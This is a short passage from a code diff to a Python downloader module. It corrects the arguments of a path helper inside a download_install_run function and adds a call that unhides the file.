@@ -58,7 +58,11 @@ class Downloader(threading.Thread):
         print command
         
 def download_install_run(url, specialpath, fname):
-    path = file_in_special_path(special)
+    #Get a path for the file and unhide it.
+    path = file_in_special_path(specialpath, fname)
+    unhide_file(path)
+    
+    
         
 #Utility functions.  May be useful elsewhere
 def file_in_special_path(specialpath, fname):
